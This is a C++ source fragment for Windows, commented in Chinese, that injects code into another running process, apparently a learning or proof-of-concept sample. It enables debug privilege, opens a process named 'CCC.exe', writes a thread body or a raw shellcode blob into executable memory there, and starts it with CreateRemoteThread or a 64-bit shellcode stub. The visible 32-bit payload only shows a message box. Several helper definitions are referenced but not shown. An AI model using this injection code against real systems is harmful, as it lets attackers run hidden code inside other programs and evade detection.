LPVOID init_func(char* asmcode, DWORD len)
{
	LPVOID sc = NULL;
	// allocate write/executable memory for code
	sc = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (sc != NULL) {
		// copy code
		memcpy(sc, asmcode, len);
	}
	else {
		MessageBoxA(NULL, "VirtualAlloc()", "Notice", MB_ICONINFORMATION | MB_OK);
	}
	return sc;
}
int main()
{
	const DWORD dwThreadSize = 4096;
	DWORD dwWriteBytes = 0;
	enableDebugPriv();
	HANDLE TargetProc = GetProcessHandleByName(L"CCC.exe");//进程名称
	if (!TargetProc)
	{
		MessageBoxA(NULL,
			"Open target process failed !",
			"Notice", MB_ICONINFORMATION | MB_OK);
		return 0;
	}

	BOOL ISWow64 = false;
	IsWow64Process(TargetProc, &ISWow64);

	if (ISWow64)
	{
		cout << "32Bit Process " <<endl;
		//在宿主进程中为线程体开辟一块存储区域  
		//在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  
		//其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  
		void* pRemoteThread = VirtualAllocEx(TargetProc, 0,
			dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!pRemoteThread) {
			MessageBoxA(NULL, "Alloc memory in target process failed !",
				"notice", MB_ICONINFORMATION | MB_OK);
			return 0;
		}

		//将线程体拷贝到宿主进程中  
		if (!WriteProcessMemory(TargetProc,
			pRemoteThread, &threadProc, dwThreadSize, 0)) {
			MessageBoxA(NULL, "Write data to target process failed !",
				"Notice", MB_ICONINFORMATION | MB_OK);
			return 0;
		}
		cout << "pRemoteThread:" << hex << pRemoteThread << endl;
		getchar();
		//定义线程参数结构体变量  
		RemoteParam remoteData;
		ZeroMemory(&remoteData, sizeof(RemoteParam));

		//填充结构体变量中的成员  
		HINSTANCE hUser32 = LoadLibrary(L"User32.dll");
		remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, "MessageBoxA");
		strcat_s(remoteData.szMsg, "Hello＼0");

		//为线程参数在宿主进程中开辟存储区域  
		RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(
			TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);

		if (!pRemoteParam) {
			MessageBoxA(NULL, "Alloc memory failed !",
				"Notice", MB_ICONINFORMATION | MB_OK);
			return 0;
		}
		//将线程参数拷贝到宿主进程地址空间中  
		if (!WriteProcessMemory(TargetProc,
			pRemoteParam, &remoteData, sizeof(remoteData), 0)) {
			MessageBoxA(NULL, "Write data to target process failed !",
				"Notice", MB_ICONINFORMATION | MB_OK);
			return 0;
		}

		//在宿主进程中创建线程  
		HANDLE hRemoteThread = CreateRemoteThread(
			TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,
			pRemoteParam, 0, &dwWriteBytes);
		if (!hRemoteThread) {
			MessageBoxA(NULL, "Create remote thread failed !", "Notice", MB_ICONINFORMATION | MB_OK);
			return 0;
		}
		CloseHandle(hRemoteThread);
		FreeLibrary(hUser32);
		return 0;

	}
	else
	{

		cout << "64Bit Process " << endl;
		void* pRemoteThread = VirtualAllocEx(TargetProc, 0,
			EXECPIC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!pRemoteThread) {
			MessageBoxA(NULL, "Alloc memory in target process failed !",
				"notice", MB_ICONINFORMATION | MB_OK);
			return 0;
		}
		if (!WriteProcessMemory(TargetProc, pRemoteThread, EXECPIC, EXECPIC_SIZE, 0))
		{
			MessageBoxA(NULL, "Write data to target process failed !",
				"Notice", MB_ICONINFORMATION | MB_OK);
			return 0;
		}
		HANDLE hThread = NULL;
		pCreateRemoteThread64 CreateRemoteThread64 = (pCreateRemoteThread64)init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE);
		CreateRemoteThread64(TargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, 0, 0, 0, &hThread);
		if (!hThread)
		{
			MessageBoxA(NULL, "CreateRemoteThread64 target thread failed !",
				"Notice", MB_ICONINFORMATION | MB_OK);
			return 0;
		}
		WaitForSingleObject(hThread, INFINITE);
	}
	return 0;
}
```











